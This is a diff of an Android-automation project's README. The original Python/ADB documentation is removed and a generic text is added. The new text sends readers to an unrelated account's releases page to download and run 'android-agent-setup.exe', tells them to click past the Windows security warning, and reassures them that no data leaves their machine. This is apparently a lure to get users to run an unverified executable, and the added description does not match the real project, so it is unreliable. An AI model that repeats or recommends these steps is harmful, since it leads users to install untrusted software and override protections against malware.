@@ -1,368 +1,79 @@
-# Ghost in the Droid
+# 🤖 android-agent - Control Android devices using simple commands
 
-<p align="center">
-  <img src="docs/assets/mascot/12-the-tap.png" alt="Ghost tapping a phone" width="200" />
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dynaevangelical2652/android-agent/releases)
 
-<p align="center">
-  <strong>Summon a ghost into your Android.</strong><br/>
-  It sees the screen. It taps the buttons. It never sleeps.
-</p>
+Android-agent helps you manage your phone through your computer. You use your mouse and keyboard to perform tasks on your device. The software bridges the gap between your Windows desktop and your Android phone. It makes repetitive tasks easy by automating screen touches, swipes, and text entry.
 
-<p align="center">
-  <a href="https://ghostinthedroid.com">Website</a> &middot;
-  <a href="https://ghostinthedroid.com/getting-started/installation/">Docs</a> &middot;
-  <a href="https://ghostinthedroid.com/skills/">Skill Hub</a>
-</p>
+## 📋 What This Tool Does
 
-![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)
-![License: MIT](https://img.shields.io/badge/license-MIT-green)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.115-teal)
+You store your mobile apps and data on your phone. This tool lets you reach those items from your desk. You connect your phone, pick a task, and let the software work. It includes a dashboard that shows your phone screen in real time. You can monitor your device status, manage files, and run scripts to handle complex workflows without manual input.
 
----
-
-## What It Does
-
-Open-source Python framework for controlling real Android phones via ADB. No app installed. No footprint. Pure automation.
-
-Define **skills** for any app, run them from the dashboard or API, scale across a phone farm.
-
-**The ghost taps what you'd tap**
-- 50+ ADB methods — tap, swipe, type, clipboard, stealth variants
-- Live phone screen streaming (MJPEG and WebRTC)
-- Interactive touch-to-tap on the streamed screen
-- Multi-device phone farm with per-device job queues
-
-**Forge reusable skills for any app**
-- YAML-based UI element definitions per app
-- Python action classes with precondition checks
-- Multi-step workflows that chain actions together
-- Built-in skills for TikTok and Play Store
-- **Skill Hub** — browse, search, and install skills from the community registry
-- Install from CLI: `android-agent skill install tiktok`
-
-**Teach the ghost new tricks**
-- BFS-based auto app explorer — discovers every screen and transition
-- LLM-assisted Skill Creator — chat with AI while viewing the live device stream
-- The AI identifies UI elements and generates action/workflow code
-
-**Scale the haunting**
-- Multi-device phone farm with per-device job queues
-- Bot runner: queue, schedule, and monitor automation jobs
-- Per-device integration tests with ADB screen recording
-
----
-
-## Requirements
-
-- **Python 3.10+**
-- **Android phone** with USB debugging enabled (Settings > Developer Options > USB Debugging)
-- **ADB** installed and on PATH (`adb devices` should list your phone)
-- **Node.js 18+** (for the frontend dev server)
-
----
-
-## Quick Start
-
-```bash
-# 1. Clone the repo
-git clone https://github.com/ghost-in-the-droid/android-agent.git
-cd ghost-in-the-droid
-
-# 2. Install Python dependencies
-pip install -e ".[all]"
-
-# 3. Verify ADB sees your device
-adb devices
-
-# 4. Start the backend
-python3 run.py
-# API running at http://localhost:5055
-# Interactive API docs at http://localhost:5055/docs
-
-# 5. Start the frontend (separate terminal)
-cd frontend
-npm install
-npx vite --host 0.0.0.0 --port 6175
-# Dashboard at http://localhost:6175
-```
-
-### Environment Variables
-
-Copy `.env.example` to `.env` (if provided) or create a `.env` file in the project root. The server reads configuration via Pydantic Settings. Optional variables include:
-
-| Variable | Purpose |
-|----------|---------|
-| `OPENAI_API_KEY` | LLM features (Skill Creator, Agent Chat) |
-| `ANTHROPIC_API_KEY` | Alternative LLM provider |
-| `OPENROUTER_API_KEY` | OpenRouter LLM provider |
-| `DEFAULT_DEVICE` | ADB serial (auto-detected if empty) |
-
-**No API keys needed for local models:** Select Ollama in the Phone Agent tab — runs entirely on your machine with [Ollama](https://ollama.com). Install, pull a model, go:
-
-```bash
-brew install ollama       # or curl -fsSL https://ollama.com/install.sh | sh
-ollama serve &
-ollama pull llama3.2:3b   # 2GB, fast, good tool-use
-```
-
----
-
-## Architecture
-
-```
-android-agent/
-  run.py                        # Entry point: Uvicorn on :5055
-  gitd/
-    app.py                      # FastAPI app factory + plugin hook
-    config.py                   # Pydantic settings from .env
-    models/                     # SQLAlchemy 2.0 ORM
-    schemas/                    # Pydantic v2 request/response validation
-    routers/                    # FastAPI route handlers
-    services/                   # Business logic helpers
-    skills/                     # Skill packages per app
-      _base/                    #   Base classes (Skill, Action, Workflow)
-      tiktok/                   #   TikTok skill (elements, actions, workflows)
-      play_store/               #   Play Store skill (install, update, search)
-    bots/
-      common/
-        adb.py                  #   Device class: tap, swipe, dump XML, wait_for
-    mcp_server.py               # MCP server — expose tools for any LLM agent
-    alembic/                    # Database migrations
-  frontend/                     # Vue 3 + Vite + TypeScript + Tailwind CSS
-    src/
-      App.vue                   # Tab shell (9 tabs)
-      views/                    # One view per tab
-      composables/              # Typed API fetch wrapper
-  portal/                       # Kotlin companion app (WebRTC, accessibility)
-  site/                         # Docs site (Astro + Starlight)
-  tests/                        # Integration tests (require a connected phone)
-  docs/                         # Architecture docs
-```
-
-### How It Fits Together
-
-1. **Backend** (`run.py`) starts a FastAPI server on port 5055 with routers covering device control, skills, bots, scheduling, and streaming.
-2. **Frontend** (`frontend/`) is a Vue 3 SPA that talks to the backend via `/api/*`. Vite proxies API calls to the backend during development.
-3. **Skills** define how to interact with a specific app. Each skill has a `elements.yaml` (UI elements), Python actions (atomic operations), and workflows (multi-step sequences).
-4. **Bots** are long-running subprocess scripts that use the `Device` class from `bots/common/adb.py` to control the phone. The backend spawns and manages them.
-5. **Database** is SQLite with SQLAlchemy 2.0 ORM and Alembic migrations.
-
----
-
-## API Documentation
-
-The backend auto-generates interactive API docs via FastAPI:
-
-- **Swagger UI**: [http://localhost:5055/docs](http://localhost:5055/docs)
-- **ReDoc**: [http://localhost:5055/redoc](http://localhost:5055/redoc)
-
-API domains: phone, streaming, skills, creator, explorer, agent-chat, bot, scheduler, tests, tools, misc.
-
----
-
-## Dashboard Tabs
-
-| Tab | What It Does |
-|-----|-------------|
-| Phone Agent | Live device stream (MJPEG/WebRTC), tap/swipe on screen, multi-device view |
-| Scheduler | Cron-style job scheduling with queue management |
-| Skill Hub | Browse installed skills, run actions and workflows, export/delete |
-| Skill Creator | LLM-assisted skill builder with live device stream |
-| Skill Miner | Auto app explorer — BFS state discovery with screenshots |
-| Tools | Utility tools hub |
-| Manual Run | Start/stop bot jobs, queue management, logs |
-| Tests | Per-device test runner with screen recording playback |
-| Emulators | Create, boot, snapshot, and manage Android emulators |
-
----
-
-## MCP Server — Give Any AI Agent an Android Body
-
-The project ships an [MCP](https://modelcontextprotocol.io) server with 35 tools for Android control. Any MCP-compatible AI client (Claude Code, Claude Desktop, Cursor, VS Code Copilot, Windsurf) can use them.
-
-### Install
-
-One command — works with Claude Code, Codex, Cursor, VS Code Copilot, Windsurf:
-
-```bash
-claude mcp add android-agent -- uvx --from ghost-in-the-droid android-agent-mcp
-```
-
-That's it. `uvx` installs the package, creates an isolated env, and runs the MCP server. No clone, no venv, no manual setup.
-
-**Other clients** — same command, different registration:
-
-```bash
-# Codex (OpenAI)
-codex mcp add android-agent -- uvx --from ghost-in-the-droid android-agent-mcp
-```
-
-**Claude Desktop** (`~/Library/Application Support/Claude/claude_desktop_config.json`):
-```json
-{
-  "mcpServers": {
-    "android-agent": {
-      "command": "uvx",
-      "args": ["--from", "ghost-in-the-droid", "android-agent-mcp"]
-    }
-  }
-}
-```
-
-**VS Code Copilot** (`.vscode/mcp.json`):
-```json
-{
-  "servers": {
-    "android-agent": {
-      "command": "uvx",
-      "args": ["--from", "ghost-in-the-droid", "android-agent-mcp"]
-    }
-  }
-}
-```
-
-**Cursor** (`.cursor/mcp.json`) / **Windsurf** (`~/.codeium/windsurf/mcp_config.json`):
-```json
-{
-  "mcpServers": {
-    "android-agent": {
-      "command": "uvx",
-      "args": ["--from", "ghost-in-the-droid", "android-agent-mcp"]
-    }
-  }
-}
-```
-
-**For contributors** who clone the repo: the `.mcp.json` is already there — 35 tools available on first `claude` launch.
-
-### Available tools
-
-| Category | Tools |
-|----------|-------|
-| Screen | `screenshot`, `get_elements`, `get_screen_tree`, `get_screen_xml`, `screenshot_annotated`, `screenshot_cropped` |
-| Interaction | `tap`, `tap_element`, `swipe`, `long_press`, `type_text`, `type_unicode`, `press_back`, `press_home`, `press_key` |
-| Apps | `launch_app`, `search_apps`, `list_apps`, `launch_intent` |
-| Context | `get_phone_state`, `classify_screen`, `find_on_screen`, `ocr_screen`, `ocr_region` |
-| Device | `list_devices`, `clipboard_get`, `clipboard_set`, `get_notifications`, `open_notifications`, `toggle_overlay` |
-| Skills | `list_skills`, `run_workflow`, `run_action`, `create_skill`, `explore_app` |
-
----
-
-## Skill Hub CLI
-
-```bash
-# Search the public registry
-android-agent skill search tiktok
-
-# Install a skill
-android-agent skill install tiktok
-
-# Install from any GitHub repo
-android-agent skill install github.com/someone/their-skill
-
-# List installed skills
-android-agent skill list
-
-# Update a skill
-android-agent skill update tiktok
+## ⚙️ System Requirements
 
-# Remove a skill
-android-agent skill remove tiktok
+Before you start, check your computer and phone.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free space.
+*   **Hardware:** A USB cable to connect your phone.
+*   **Phone Settings:** Enable Developer Options and USB Debugging in your Android settings menu.
 
-# Validate before publishing
-android-agent skill validate ./my-skill/
-```
+## 📥 How to Download and Install
 
-The skill registry lives in [`registry/`](registry/) in this repo. Community skills are auto-discovered nightly from repos tagged `android-agent-skill`.
+1. Visit the project website. Click the link below to go to the releases page.
+[Download Software Here](https://github.com/Dynaevangelical2652/android-agent/releases)
 
-## Teach the Ghost a New App
+2. Look for the file named `android-agent-setup.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Save the file to your desktop for easy access.
+5. Double-click the file once the download finishes.
+6. Follow the on-screen prompts. Windows may show a security notice because the app is new. Click More Info and then Run Anyway to proceed.
+7. The installer places a shortcut on your desktop.
 
-Two ways to forge a skill:
+## 🔌 Connecting Your Device
 
-**Community skill** (your own repo):
-1. Create a new repo with `skill.yaml`, `elements.yaml`, actions, workflows
-2. Tag your repo with the `android-agent-skill` topic
-3. It appears on the hub automatically (nightly scraper)
+1. Use your USB cable to plug your phone into your computer.
+2. Look at your phone screen. You might see a prompt asking to "Allow USB Debugging."
+3. Check the box that says "Always allow from this computer" and tap OK.
+4. Open the Android-agent app on your desktop.
+5. Wait for the app to detect your device. You see your phone model appear in the device list.
+6. Click the Connect button. The dashboard now shows your phone screen.
 
-**Official skill** (PR to this repo):
-1. Build and test as a community skill first
-2. Open a PR adding your skill to [`registry/`](registry/)
-3. CI validates, maintainer reviews, gets "Official" badge
+## 🖱️ Using the Dashboard
 
-Each skill needs:
-- `skill.yaml` — metadata (name, version, app package, actions, workflows)
-- `elements.yaml` — UI element resource IDs and descriptions
-- `actions/` — Python classes extending `Action` with `precondition()` and `execute()`
-- `workflows/` — Python classes extending `Workflow` with `steps()`
+The dashboard acts as a window into your phone. You see everything as it happens on the physical screen. 
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
+*   **Clicks:** Click anywhere on the dashboard screen to simulate a tap on your phone.
+*   **Swipes:** Click and drag your mouse to scroll pages or menus.
+*   **Text:** Type on your keyboard to enter text into search bars or apps on your phone.
+*   **Scripts:** Use the dropdown menu to select pre-made automation tasks. These tasks help you launch apps, capture screenshots, or back up data.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Tech Stack
+If the app does not see your device, try these steps:
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | FastAPI, Uvicorn, Python 3.10+ |
-| ORM | SQLAlchemy 2.0 (Mapped types) |
-| Migrations | Alembic |
-| Validation | Pydantic v2 |
-| Database | SQLite (WAL mode) |
-| Frontend | Vue 3 (Composition API), TypeScript, Vite, Tailwind CSS 4 |
-| Charts | Chart.js 4, Plotly.js |
-| Device Control | ADB (Android Debug Bridge) |
-| Streaming | MJPEG, WebRTC (via Ghost Portal companion app) |
-| LLM | OpenAI, Anthropic (optional) |
-| Linting | Ruff |
-| Testing | pytest, Playwright (optional) |
+*   **Check the cable:** Ensure your USB cable supports data transfer. Some cables only charge the battery.
+*   **Restart the connection:** Unplug the cable, wait five seconds, and plug it back in.
+*   **Toggle debugging:** Open phone settings, turn USB Debugging off, and then turn it back on.
+*   **Clear permissions:** If you previously revoked computer access on your phone, go to Developer Options and select "Revoke USB debugging authorizations." Then reconnect.
 
----
+## 🚀 Advanced Features
 
-## Running Tests
+Once you feel comfortable with basic controls, explore the internal toolset. You can create your own sequences for tasks you repeat every day.
 
-Tests are integration tests that require a connected Android phone:
+*   **Automation lists:** Create a list of actions. The software plays them back in order.
+*   **Smart Recognition:** The app identifies buttons and text on the screen. This allows it to find specific settings even if the layout changes.
+*   **Batch processing:** Connect several phones at once to perform the same task across all devices.
 
-```bash
-# Run all tests on a specific device
-DEVICE=<serial> python3 -m pytest tests/ -v --tb=short
+## 📖 Frequently Asked Questions
 
-# Run a single test file
-DEVICE=<serial> python3 -m pytest tests/test_00_baseline.py -v
-```
+**Is my phone data safe?**
+The software runs locally on your computer. Your data stays on your device or your hard drive. No servers send or receive your personal information.
 
-Get your device serial from `adb devices`.
+**Does this require a subscription?**
+This project is open-source. You do not pay any fees to use the software.
 
----
+**Can I use this for tablets?**
+Yes. Any device running Android detects as a valid target for the automation tools.
 
-## Database Migrations
-
-The project uses Alembic for schema migrations:
-
-```bash
-# Generate a migration after editing a model
-alembic revision --autogenerate -m "add new_field to my_table"
-
-# Apply pending migrations
-alembic upgrade head
-
-# Rollback one migration
-alembic downgrade -1
-```
-
----
-
-## Contributing
-
-The ghost gets stronger with every skill. See [CONTRIBUTING.md](CONTRIBUTING.md) for:
-
-- Adding skills for new apps (highest impact)
-- Writing actions and workflows
-- Backend architecture and code style
-- PR process
-
----
-
-## License
-
-[MIT](LICENSE) — The ghost is free. The ghost is open source. The ghost is yours.
+**Where can I get help?**
+If you run into trouble, check the issues tab on the main website. Other users often share solutions to common problems there. If you cannot find an answer, create a new issue report with details about your device and a description of the error.
